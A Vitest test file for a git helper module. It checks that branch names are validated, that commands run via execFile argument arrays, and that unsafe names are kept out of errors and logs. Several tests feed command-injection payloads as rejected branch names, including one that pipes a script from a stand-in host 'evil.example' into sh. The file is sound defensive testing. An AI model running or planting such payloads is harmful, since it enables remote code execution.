import { beforeEach, describe, expect, it, vi } from 'vitest';

interface ExecFileResult {
  stdout: string;
  stderr: string;
}

const { execFileAsyncMock } = vi.hoisted(() => ({
  execFileAsyncMock: vi.fn<(...args: unknown[]) => Promise<ExecFileResult>>(),
}));

vi.mock('node:child_process', () => ({
  execFile: vi.fn(),
}));

vi.mock('node:util', () => ({
  promisify: vi.fn(() => execFileAsyncMock),
}));

import {
  checkoutBranch,
  describeGitBranchForLog,
  getCurrentBranch,
  getGitRepoRoot,
  hasUncommittedChanges,
  isValidGitBranchName,
  listBranches,
  pullLatest,
  runPnpmBuild,
  runPnpmInstall,
  stashChanges,
  validateGitBranchName,
} from '../../src/core/gitOperations';

function resolveWith(stdout: string): void {
  execFileAsyncMock.mockResolvedValueOnce({ stdout, stderr: '' });
}

function rejectWith(message: string): void {
  execFileAsyncMock.mockRejectedValueOnce(new Error(message));
}

function expectExecFileCall(
  index: number,
  command: string,
  args: readonly string[],
  cwd: string,
  timeout: number,
): void {
  const call = execFileAsyncMock.mock.calls[index];
  expect(call?.[0]).toBe(command);
  expect(call?.[1]).toEqual(args);
  expect(call?.[2]).toMatchObject({ cwd, timeout });
}

async function expectInvalidCheckoutRejected(branch: string): Promise<void> {
  await expect(checkoutBranch('/repo', branch)).rejects.toThrow('Invalid git branch name');
  expect(execFileAsyncMock).not.toHaveBeenCalled();

  try {
    await checkoutBranch('/repo', branch);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    expect(message).not.toContain(branch);
  }
}

beforeEach(() => {
  execFileAsyncMock.mockReset();
});

describe('git branch validation', () => {
  it('accepts common safe branch names', () => {
    expect(isValidGitBranchName('main')).toBe(true);
    expect(isValidGitBranchName('feature/sample-flow')).toBe(true);
    expect(isValidGitBranchName('release-1.2.3')).toBe(true);
    expect(isValidGitBranchName('sample_branch')).toBe(true);
  });

  it('rejects branch names with shell metacharacters', () => {
    expect(isValidGitBranchName('main; curl http://evil.example/x.sh | sh')).toBe(false);
    expect(isValidGitBranchName('main && touch /tmp/sentinel')).toBe(false);
    expect(isValidGitBranchName('main|sh')).toBe(false);
    expect(isValidGitBranchName('main$(touch /tmp/sentinel)')).toBe(false);
    expect(isValidGitBranchName('main`touch /tmp/sentinel`')).toBe(false);
  });

  it('rejects spaces and quotes', () => {
    expect(isValidGitBranchName('feature bad')).toBe(false);
    expect(isValidGitBranchName('"feature"')).toBe(false);
    expect(isValidGitBranchName("feature'bad")).toBe(false);
  });

  it('throws a clear error without echoing the unsafe payload', () => {
    const payload = 'main; touch /tmp/sentinel';

    expect(() => {
      validateGitBranchName(payload);
    }).toThrow('Invalid git branch name');
    try {
      validateGitBranchName(payload);
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      expect(message).toContain('Check cap-debug-config.json');
      expect(message).not.toContain(payload);
    }
  });

  it('redacts unsafe branch names for logs', () => {
    expect(describeGitBranchForLog('feature/sample-flow')).toBe('feature/sample-flow');
    expect(describeGitBranchForLog('main; touch /tmp/sentinel')).toBe('[invalid git branch name]');
  });
});

describe('getGitRepoRoot', () => {
  it('returns the repo root path using execFile args', async () => {
    resolveWith('/home/user/project\n');
    expect(await getGitRepoRoot('/home/user/project/src')).toBe('/home/user/project');
    expectExecFileCall(0, 'git', ['rev-parse', '--show-toplevel'], '/home/user/project/src', 30_000);
  });

  it('returns null on error', async () => {
    rejectWith('not a git repository');
    expect(await getGitRepoRoot('/not/a/repo')).toBeNull();
  });
});

describe('getCurrentBranch', () => {
  it('returns the current branch name', async () => {
    resolveWith('develop\n');
    expect(await getCurrentBranch('/repo')).toBe('develop');
    expectExecFileCall(0, 'git', ['rev-parse', '--abbrev-ref', 'HEAD'], '/repo', 30_000);
  });

  it('returns null for detached HEAD', async () => {
    resolveWith('HEAD\n');
    expect(await getCurrentBranch('/repo')).toBeNull();
  });

  it('returns null on error', async () => {
    rejectWith('not a git repo');
    expect(await getCurrentBranch('/repo')).toBeNull();
  });
});

describe('hasUncommittedChanges', () => {
  it('returns true when porcelain output is non-empty', async () => {
    resolveWith('M src/file.ts\n');
    expect(await hasUncommittedChanges('/repo')).toBe(true);
    expectExecFileCall(0, 'git', ['status', '--porcelain'], '/repo', 30_000);
  });

  it('returns false when working tree is clean', async () => {
    resolveWith('');
    expect(await hasUncommittedChanges('/repo')).toBe(false);
  });

  it('returns false on git error', async () => {
    rejectWith('not a git repo');
    expect(await hasUncommittedChanges('/repo')).toBe(false);
  });
});

describe('stashChanges', () => {
  it('returns true when stash is created through execFile args', async () => {
    resolveWith('Saved working directory and index state WIP on main: abc1234 message');
    expect(await stashChanges('/repo')).toBe(true);

    const call = execFileAsyncMock.mock.calls[0];
    expect(call?.[0]).toBe('git');
    expect(call?.[1]).toEqual([
      'stash',
      'push',
      '-u',
      '-m',
      expect.stringMatching(/^cds-debug-autostash-\d{4}-\d{2}-\d{2}T/),
    ]);
    expect(call?.[2]).toMatchObject({ cwd: '/repo', timeout: 30_000 });
  });

  it('returns false when nothing to stash', async () => {
    resolveWith('No local changes to save');
    expect(await stashChanges('/repo')).toBe(false);
  });
});

describe('checkoutBranch', () => {
  it('checks out a valid branch using execFile args', async () => {
    resolveWith("Switched to branch 'develop'");
    await expect(checkoutBranch('/repo', 'develop')).resolves.toBeUndefined();
    expectExecFileCall(0, 'git', ['checkout', 'develop'], '/repo', 30_000);
  });

  it('throws on checkout failure', async () => {
    rejectWith("error: pathspec 'nonexistent' did not match any file(s) known to git");
    await expect(checkoutBranch('/repo', 'nonexistent')).rejects.toThrow();
  });

  it('rejects shell meta character payloads before running git', async () => {
    await expectInvalidCheckoutRejected('main; curl http://evil.example/x.sh | sh; #');
    await expectInvalidCheckoutRejected('main && touch /tmp/sentinel');
    await expectInvalidCheckoutRejected('main$(touch /tmp/sentinel)');
    await expectInvalidCheckoutRejected('main`touch /tmp/sentinel`');
  });

  it('rejects branch names with spaces or quotes before running git', async () => {
    await expectInvalidCheckoutRejected('feature bad');
    await expectInvalidCheckoutRejected('"feature"');
    await expectInvalidCheckoutRejected("feature'bad");
  });
});

describe('listBranches', () => {
  it('returns deduplicated sorted branch list', async () => {
    resolveWith(
      '* main\n  develop\n  remotes/origin/main\n  remotes/origin/develop\n  remotes/origin/feature/test',
    );
    const branches = await listBranches('/repo');
    expect(branches).toEqual(['develop', 'feature/test', 'main']);
    expectExecFileCall(0, 'git', ['branch', '-a'], '/repo', 30_000);
  });

  it('filters out HEAD pointers', async () => {
    resolveWith(
      '* main\n  remotes/origin/HEAD -> origin/main\n  remotes/origin/main',
    );
    const branches = await listBranches('/repo');
    expect(branches).toEqual(['main']);
  });

  it('returns empty array on error', async () => {
    rejectWith('not a git repo');
    expect(await listBranches('/repo')).toEqual([]);
  });
});

describe('pullLatest', () => {
  it('returns success false when fetch fails', async () => {
    rejectWith('offline');

    await expect(pullLatest('/repo')).resolves.toEqual({ success: false, changed: false });
    expectExecFileCall(0, 'git', ['fetch'], '/repo', 30_000);
  });

  it('returns success true and changed false when ff-only reports up to date', async () => {
    resolveWith('');
    resolveWith('Already up to date.\n');

    await expect(pullLatest('/repo')).resolves.toEqual({ success: true, changed: false });
    expectExecFileCall(0, 'git', ['fetch'], '/repo', 30_000);
    expectExecFileCall(1, 'git', ['pull', '--ff-only'], '/repo', 30_000);
  });

  it('falls back to rebase when ff-only fails', async () => {
    resolveWith('');
    rejectWith('diverged history');
    resolveWith('Updating abc123..def456\n');

    await expect(pullLatest('/repo')).resolves.toEqual({ success: true, changed: true });
    expectExecFileCall(2, 'git', ['pull', '--rebase'], '/repo', 30_000);
  });

  it('returns success false when both ff-only and rebase fail', async () => {
    resolveWith('');
    rejectWith('diverged history');
    rejectWith('rebase conflict');

    await expect(pullLatest('/repo')).resolves.toEqual({ success: false, changed: false });
  });
});

describe('pnpm commands', () => {
  it('runs pnpm install without a shell command string', async () => {
    resolveWith('');
    await runPnpmInstall('/repo/service');
    expectExecFileCall(0, 'pnpm', ['i', '--shamefully-hoist'], '/repo/service', 120_000);
  });

  it('runs pnpm build without a shell command string', async () => {
    resolveWith('');
    await runPnpmBuild('/repo/service');
    expectExecFileCall(0, 'pnpm', ['build'], '/repo/service', 300_000);
  });
});
